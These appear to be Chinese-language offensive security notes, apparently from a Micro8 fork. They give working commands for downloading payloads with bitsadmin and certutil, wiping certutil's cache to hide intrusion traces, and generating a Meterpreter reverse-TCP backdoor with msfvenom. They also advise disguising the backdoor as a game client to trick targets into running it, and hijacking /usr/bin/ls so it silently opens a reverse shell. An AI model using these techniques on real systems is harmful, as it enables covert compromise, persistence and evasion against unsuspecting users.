from:
```
https://github.com/micro8
https://micro8.github.io/Micro8-HTML/Chapter1/1_windows%E6%8F%90%E6%9D%83-%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BEexp.html
```

bitsadmin测试
```
基本用法:
bitsadmin /transfer 任务名 https://files.cnblogs.com/files/gayhub/bcn.js c:\bcn.bat

bitsadmin /transfer test https://github.com/aceliuchanghong/Micro8_fork/blob/master/20190220112709.png C:\Users\liuch\Documents\WXWork\0.png
设置任务test为最高优先级:
bitsadmin /setpriority test foreground

bitsadmin /transfer test https://images.cnblogs.com/cnblogs_com/gayhub/870028/o_5080b900.jpg C:\Users\liuch\Documents\WXWork\0.jpg
```
Certutil
```
是 Windows 操作系统上预装的工具，可用于 校验文件MD5、SHA1、SHA256，下载恶意文件和免杀

1.不能打开 .exe 可执行文件时，可以使用 certutil 对可执行文件进行编码。然后传输编码后的数据，然后在接收机上对其进行解码
Add-Content 00.txt "txt"
type .\00.txt 
加密:
certutil -encode 00.txt 11.txt
解密:
certutil.exe -decode .\11.txt 22.txt

2.获取数据并传递固定长度的输出字符串。使用哈希加密算法，
验证两个文件是否相同。该校验和是用于执行检查的散列值的数据完整性，这是一种文件签名。通过比较校验和，我们可以识别重复文件
certutil -hashfile 22.txt MD5
certutil -hashfile 22.txt SHA1
certutil -hashfile 22.txt SHA256

3.certutil 还可用于从互联网下载文件。
certutil -urlcache -split -f "https://rs.kantie.org/it/https://web.popo8.com/202310/30/7/ab4ace7a4ftype_png_size_661_213_end.jpg" dll.jpg

certutil下载有个弊端，它的每一次下载都有留有缓存，而导致留下入侵痕迹，所以每次下载后，需要马上执行如下：
certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt delete
```
msfvenom
```
Msfvenom主要用来生成带后门的软件
eg:msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=4444 -a x86 --platform Windows -f exe > reverse_tcp.exe
文件生成后就需要想办法将文件传给目标了，可以放到网站上，也可以邮件发过去，名字改成有点吸引力一些，或者伪装成游戏客户端之类的。反正最终目的就是让目标运行这个文件
只要在LHOST有监听LPORT端口，在目标运行文件时，就能获取到session。至于怎么监听，可以是nc，也可以是Metasploit中的handler模块

将带毒的文件嵌套到/usr/bin里面的常用工具中，比如将ls文件改个名字，然后再新建一个ls文件，再这个新的ls文件中调用原ls文件和带毒的文件，例如这样
/usr/bin/ls_bak
/root/reverse_tcp.elf & >& /dev/null &
这样靶机的操作者使用ls的时候，还是能获取到一样的内容，但是再后台会同时发起连接
```











































